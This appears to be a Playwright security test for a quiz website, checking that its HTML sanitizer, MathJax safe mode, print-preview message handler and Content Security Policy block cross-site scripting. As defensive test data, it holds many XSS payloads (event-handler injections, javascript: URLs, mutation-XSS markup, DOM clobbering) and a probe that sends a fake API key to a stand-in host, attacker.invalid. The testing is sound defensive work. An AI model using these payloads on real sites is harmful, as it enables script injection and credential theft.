'use strict';
// Real DOM, MathJax and CSP; fake credentials only, no public writes or model calls.
const fs = require('node:fs'), path = require('node:path'), assert = require('node:assert/strict');
const { chromium } = require(process.env.PLAYWRIGHT_MODULE || 'playwright');
const root = path.resolve(__dirname, '..'), url = process.env.ICS_TEST_URL || 'http://127.0.0.1:4189/';
const source = fs.readFileSync(path.join(root, 'site/ics-test.js'), 'utf8').replace('  init();',
  '  window.__test = {renderContent}; init();');
function stub() {
  window.__writes = []; window.__papers = []; window.__reports = [];
  window.supabase = { createClient() { return {
    from(table) { return { select() { return this; }, order() { return this; }, in() { return Promise.resolve({ data: [] }); },
      range() { return Promise.resolve({ data: table === 'ics_community_paper_reports' ? window.__reports : [] }); }, then(resolve, reject) { return Promise.resolve({ data: [] }).then(resolve, reject); } }; },
    channel() { return { on() { return this; }, subscribe() { return this; } }; }, removeChannel() {},
    rpc(name, args) {
      if (name === 'list_ics_community_papers') return Promise.resolve({ data: window.__papers });
      window.__writes.push({ name, args }); return Promise.resolve({ data: [] });
    },
  }; } };
}
async function probeCsp() {
  // Run as a same-origin external script, not DevTools evaluation (which bypasses eval CSP).
  window.__probeStarted = true;
  const inline = document.createElement('script'); inline.textContent = 'window.__pwned=20'; document.body.append(inline);
  const foreign = document.createElement('script'); foreign.src = 'https://attacker.invalid/evil.js'; document.body.append(foreign);
  const event = document.createElement('button'); event.setAttribute('onclick', 'window.__pwned=21'); document.body.append(event); event.click();
  try { new Function('window.__pwned=22')(); } catch (_) { /* expected EvalError */ }
  await fetch('https://attacker.invalid/leak?key=' + localStorage.getItem('XSS_FAKE_API_KEY')).catch(() => {});
  const frame = document.createElement('iframe'); frame.src = 'https://attacker.invalid/'; document.body.append(frame);
  window.__probeFinished = true;
}
async function run() {
  const browser = await chromium.launch({ headless: true, ...(process.env.PLAYWRIGHT_CHANNEL ? { channel: process.env.PLAYWRIGHT_CHANNEL } : {}) });
  try {
    const context = await browser.newContext(), page = await context.newPage(), unexpected = [], errors = [];
    await context.addInitScript(() => {
      window.__violations = []; window.addEventListener('securitypolicyviolation', event => window.__violations.push({
        directive: event.effectiveDirective, uri: event.blockedURI,
      }));
      try { localStorage.setItem('XSS_FAKE_API_KEY', 'FAKE_NOT_A_REAL_API_KEY'); } catch (_) { /* CSP-blocked opaque frames have no storage. */ }
    });
    context.on('page', p => p.on('pageerror', e => errors.push(e.message)));
    page.on('pageerror', e => errors.push(e.message));
    await context.route('**/vendor/supabase/supabase.js', route => route.fulfill({ contentType: 'application/javascript', body: '(' + stub.toString() + ')();' }));
    await context.route('**/ics-test.js', route => route.fulfill({ contentType: 'application/javascript', body: source }));
    await context.route('**/xss-csp-probe.js', route => route.fulfill({ contentType: 'application/javascript', body: '(' + probeCsp.toString() + ')();' }));
    await context.route(u => /^https?:$/.test(u.protocol) && u.origin !== new URL(url).origin,
      route => { unexpected.push(route.request().url()); return route.abort(); });
    await page.goto(url); await page.waitForFunction(() => !document.querySelector('#ics-start').disabled);
    await page.evaluate(() => MathJax.startup.promise);
    assert.equal(await page.evaluate(() => !!MathJax.startup.document.safe), true, 'real safe extension loaded');

    const results = await page.evaluate(async () => {
      const render = text => window.__test.renderContent({ format: 'markdown', text });
      const code = '<img src=x onerror="window.__pwned=1">';
      const raw = render(code + '<script>window.__pwned=2</script>');
      const fenced = render('```html\n' + code + '\n```');
      const table = render('| Left | Right |\n| :--- | ---: |\n| **ok** | `3*2*4` |');
      const links = ['javascript:alert(1)', 'vbscript:msgbox(1)', 'data:text/html;base64,PHNjcmlwdD4=', 'java&#x09;script:alert(1)'];
      const wrapper = document.createElement('div'); wrapper.id = 'xss-markdown-qa';
      wrapper.innerHTML = render('[safe](https://example.com/)') + table + raw + fenced +
        links.map(link => render('[bad](' + link + ')')).join('') + render('![private](https://attacker.invalid/leak)') +
        render('![local](./images/favicon.jpg)');
      document.body.append(wrapper);
      const hostile = '<a id="ics-start" name="__test" href="java\tscript:alert(1)" onclick="window.__pwned=3">bad</a>' +
        '<img src="data:image/svg+xml;base64,PHN2Zz4=" onerror="window.__pwned=4">' +
        '<img src="https://attacker.invalid/leak" srcset="https://attacker.invalid/2 2x">' +
        '<svg><a xlink:href="javascript:alert(1)">x</a><animate onbegin="window.__pwned=5"/></svg>' +
        '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=window.__pwned=6>">' +
        '<iframe srcdoc="<script>window.__pwned=7</script>"></iframe><form action="https://attacker.invalid/"><input name="x"></form>' +
        '<p style="position:fixed;inset:0" data-owned="yes">text</p><table><tr><td style="text-align:right">align</td></tr></table>';
      const safe = document.createElement('div'); safe.id = 'xss-sanitizer-qa'; safe.innerHTML = ICSSecurity.sanitizeHtml(hostile); document.body.append(safe);
      const math = document.createElement('div'); math.id = 'xss-math-qa';
      math.innerHTML = render(String.raw`$\href{javascript:alert(1)}{x}$ $\href{https://attacker.invalid/leak}{y}$ $\style{position:fixed;inset:0}{z}$ $\cssId{ics-start}{t}$ $\class{evil-class}{u}$ $\require{html}$ $2^{24}=16777216$`);
      document.body.append(math); await MathJax.typesetPromise([math]);
      const before = window.DOMPurify; window.DOMPurify = null;
      let closed = false; try { render('safe'); } catch (_) { closed = true; } finally { window.DOMPurify = before; }
      return { raw, fenced, closed, tableStyle: wrapper.querySelector('th').getAttribute('style'),
        safeHref: wrapper.querySelector('a').getAttribute('rel'), imageMark: wrapper.querySelector('img[src]')?.getAttribute('data-ics-question-image'),
        imageReferrer: wrapper.querySelector('img[src]')?.getAttribute('referrerpolicy'),
        hostileSafe: safe.innerHTML, mathHtml: math.innerHTML,
        unsafeMath: [...math.querySelectorAll('mjx-container *')].some(el => el.hasAttribute('href') || el.id === 'ics-start' ||
          el.classList.contains('evil-class') || el.style.position === 'fixed'),
        badTags: safe.querySelectorAll('script,svg,math,iframe,form,input,style').length,
        badAttrs: [...safe.querySelectorAll('*')].flatMap(el => [...el.attributes]).filter(a => /^on|^id$|^name$|^data-owned$|^srcset$/.test(a.name)).length,
        badLinks: [...wrapper.querySelectorAll('a[href]')].filter(el => !/^https?:|^mailto:/.test(el.href)).length,
      };
    });
    assert.ok(results.raw.includes('&lt;img')); assert.ok(results.fenced.includes('&lt;img'));
    assert.equal(results.closed, true); assert.equal(results.tableStyle, 'text-align:left');
    assert.equal(results.safeHref, 'noopener noreferrer'); assert.equal(results.imageMark, '');
    assert.equal(results.imageReferrer, 'no-referrer'); assert.equal(results.badTags, 0); assert.equal(results.badAttrs, 0); assert.equal(results.badLinks, 0);
    assert.ok(!results.hostileSafe.includes('attacker.invalid'));
    assert.equal(results.unsafeMath, false, 'formula attributes filtered (literal error text is harmless)');
    assert.ok(results.mathHtml.includes('mjx-container'), 'ordinary mathematics still typeset');

    const publicText = '<img src=x onerror="window.__pwned=30">';
    await page.evaluate(publicText => {
      window.__papers = [{ id: 'aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee', title: publicText, author_name: publicText,
        description: publicText, created_at: new Date().toISOString(), question_ids: ['q-aaaaaaaaaaaaaaaa'], participant_count: 0, like_count: 0 }];
      window.__reports = [{ paper_id: window.__papers[0].id, paper_title: publicText, message: publicText, created_at: new Date().toISOString() }];
    }, publicText);
    await page.locator('[name="quiz-mode"][value="exam"]').check(); await page.locator('[data-paper-kind="community"]').click();
    await page.locator('.ics-community-card').waitFor();
    assert.equal(await page.locator('.ics-community-card h4').innerText(), publicText);
    assert.equal(await page.locator('.ics-community-card img, .ics-community-card [onerror]').count(), 0);
    await page.locator('[data-community="reports"] summary').click(); await page.locator('[data-community="reports-list"] article').waitFor();
    assert.ok((await page.locator('[data-community="reports-list"]').innerText()).includes(publicText));
    assert.equal(await page.locator('[data-community="reports-list"] img').count(), 0);

    // Exercise the real postMessage receiver, including hostile source/answer/metadata.
    const channel = 'aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee', opened = page.waitForEvent('popup');
    await page.evaluate(channel => window.__printPreview = window.open('./paper-print.html#' + channel, '_blank'), channel);
    const preview = await opened; await preview.waitForFunction(() => !!window.ICSSecurity && !!window.MathJax.startup);
    const attack = '<img src="./images/favicon.jpg" onload="window.__pwned=10"><script>window.__pwned=11</script>' +
      '<a href="javascript:alert(1)" id="print-save">bad</a><div style="position:fixed;inset:0">hi</div><iframe srcdoc="evil"></iframe>';
    const packet = { title: attack, author: attack, description: attack, questions: [{ id: 'q-aaaaaaaaaaaaaaaa', source: attack,
      html: attack + '<pre><code>int x = 1;</code></pre><p>$2^{24}$</p>', answer: attack }] };
    // Wrong channel is ignored.
    await page.evaluate(({ packet, channel }) => window.__printPreview.postMessage({ type: 'ics-print-data', channel: channel + 'bad', packet }, location.origin), { packet, channel });
    assert.equal(await preview.locator('#paper').isVisible(), false);
    await page.evaluate(({ packet, channel }) => window.__printPreview.postMessage({ type: 'ics-print-data', channel, packet }, location.origin), { packet, channel });
    await preview.waitForFunction(() => !document.querySelector('#print-save').disabled);
    assert.equal(await preview.locator('#paper-title').innerText(), attack);
    assert.equal(await preview.locator('#paper script, #paper iframe, #paper [onload], #paper a[href]').count(), 0);
    assert.equal(await preview.locator('#print-save').count(), 1);
    assert.equal(await preview.locator('#paper pre').innerText(), 'int x = 1;');
    await preview.locator('#print-answers').check(); await preview.waitForFunction(() => !document.querySelector('#print-save').disabled);
    assert.equal(await preview.locator('#paper-answers script, #paper-answers [onload]').count(), 0);

    // Deliberately bypass app sanitization to prove CSP is a second, independent layer.
    for (const surface of [page, preview]) {
      await surface.evaluate(() => {
        const probe = document.createElement('script'); probe.src = './xss-csp-probe.js'; document.body.append(probe);
      });
      await surface.waitForFunction(() => window.__probeFinished && window.__violations.length >= 5, null, { timeout: 5000 }).catch(async error => {
        throw new Error(error.message + ' ' + JSON.stringify(await surface.evaluate(() => ({ started: window.__probeStarted, pwned: window.__pwned, violations: window.__violations }))));
      });
      const state = await surface.evaluate(() => ({ pwned: window.__pwned, violations: window.__violations }));
      assert.equal(state.pwned, undefined, JSON.stringify(state));
      for (const rule of ['script-src-elem', 'script-src-attr', 'script-src', 'connect-src', 'frame-src'])
        assert.ok(state.violations.some(v => v.directive === rule), rule + ' blocked on both pages: ' + JSON.stringify(state));
    }
    assert.deepEqual(unexpected, []); assert.deepEqual(errors, []);
    assert.deepEqual(await page.evaluate(() => window.__writes), []);
    console.log('Browser XSS checks passed: Markdown, DOM clobbering, URLs, formula safe mode, print messages, fail-closed sanitizer and enforced CSP; no outbound calls.');
  } finally { await browser.close(); }
}
run().catch(error => { console.error(error); process.exitCode = 1; });
